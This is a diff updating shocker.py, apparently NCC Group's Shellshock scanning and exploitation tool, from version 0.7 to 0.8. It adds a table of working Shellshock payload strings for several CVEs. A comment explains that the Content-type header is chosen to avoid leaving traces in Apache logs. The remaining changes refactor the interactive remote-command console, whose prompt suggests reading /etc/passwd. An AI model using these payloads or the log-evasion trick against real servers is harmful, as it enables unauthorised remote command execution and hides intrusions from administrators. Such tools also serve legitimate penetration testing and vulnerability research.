@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 """
-shocker.py v0.7
+shocker.py v0.8
 A tool to find and exploit webservers vulnerable to Shellshock
 
 ##############################################################################
@@ -44,6 +44,17 @@ import re
 from collections import OrderedDict
 
 
+# Dictionary {CVE ref: (header, exploit)} to try on discovered CGI scripts
+# Where attack string comprises exploit + success_flag + command
+# We use the Content-type header rather than User-agent as the latter
+# leaves an obvious trace in Apache's logs whilst the former doesn't...
+# Note - Currently only CVE-2014-6271 works
+attacks = {
+    "CVE-2014-6271": ("Content-type", "() { :;}; echo; %s"),
+    "CVE-2014-7169": ("Cotent-type", "'() { function a a>\' bash -c /tmp/echo"),
+    #"CVE-2014-6278": ("Content-type", "() { _; } >_[$($())] { %s; }"),
+    }
+    
 # Wrapper object for sys.sdout to elimate buffering
 # (http://stackoverflow.com/questions/107705/python-output-buffering)
 class Unbuffered(object):
@@ -109,7 +120,7 @@ def check_hosts(host_target_list, port, verbose):
         except Exception as e:
             print "[!] Exception - %s: %s" % (host, e)
             print "[!] Omitting %s from target list..." % host
-    if len(host_target_list) > 1:
+    if len(confirmed_hosts) > 1:
         print "[+] %i of %i targets were reachable" % \
                             (len(confirmed_hosts), number_of_targets)
     else:
@@ -118,8 +129,11 @@ def check_hosts(host_target_list, port, verbose):
 
 
 def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
-    """ Go through each potential cgi in cgi_list spinning up a thread for each
+    """ Checks to see if scripts contained in cgi_list are present (i.e. 
+    return a 200 response from the server).
+    Go through each potential cgi in cgi_list spinning up a thread for each
     check. Create Request objects for each check. 
+    Return a list of cgi which exist and might be vulnerable
     """
 
     # List of potentially epxloitable URLs 
@@ -196,9 +210,11 @@ def do_exploit_cgi(proxy, target_list, header, command, verbose):
         ) for _ in range(20))
     
     # A dictionary of apparently successfully exploited targets
-    # {url: (header, exploit)}
+    # {index: (url, header, exploit)}
     # Returned to main() 
     successful_targets = OrderedDict()
+
+    counter = 1
 
     if len(target_list) > 1:
         print "[+] %i potential targets found, attempting exploits..." % len(target_list)
@@ -223,7 +239,11 @@ def do_exploit_cgi(proxy, target_list, header, command, verbose):
                         print "[!] A result was returned but was empty..."
                         print "[!] Maybe try a different exploit command?"
                     buf.close()
-                successful_targets.update({target: (header, exploit)})
+                successful_targets.update({counter: (target, 
+                                                     cve_reference,
+                                                     header, 
+                                                     exploit)})
+		counter += 1
             else:
                 if verbose: print "[-] Not vulnerable" 
     return successful_targets
@@ -263,7 +283,6 @@ def ask_for_console(proxy, successful_targets, verbose):
 
     # Initialise to non zero to enter while loop
     user_input = 1
-    ordered_url_list = successful_targets.keys()
     
     while user_input is not 0:
         result = ""
@@ -286,8 +305,10 @@ def ask_for_console(proxy, successful_targets, verbose):
             continue
         elif not user_input:
             continue
-        target = ordered_url_list[user_input-1]
-        header = successful_targets[target][0]
+        target = successful_targets[user_input][0]
+	cve_reference = successful_targets[user_input][1]
+        header = successful_targets[user_input][2]
+	exploit = successful_targets[user_input][3]
         print "[+] Entering interactive mode for %s" % target
         print "[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'"
 
@@ -303,7 +324,7 @@ def ask_for_console(proxy, successful_targets, verbose):
                 sys.stdout.flush()
                 break
             if command:
-                attack = successful_targets[target][1] + command
+                attack = successful_targets[user_input][3] + command
                 result = do_attack(proxy, target, header, attack, verbose)
             else:
                 result = ""
@@ -381,7 +402,7 @@ def main():
   (   )|            |            
    `-. |--. .-.  .-.|.-. .-. .--.
   (   )|  |(   )(   |-.'(.-' |   
-   `-' '  `-`-'  `-''  `-`--''  v0.7 
+   `-' '  `-`-'  `-''  `-`--''  v0.8 
    
  Tom Watson, tom.watson@nccgroup.com
  http://www.github.com/nccgroup/shocker
@@ -517,6 +538,6 @@ def main():
     else:
         print "[+] No targets found to exploit"
 
-__version__ = '0.7'
+__version__ = '0.8'
 if __name__ == '__main__':
     main()
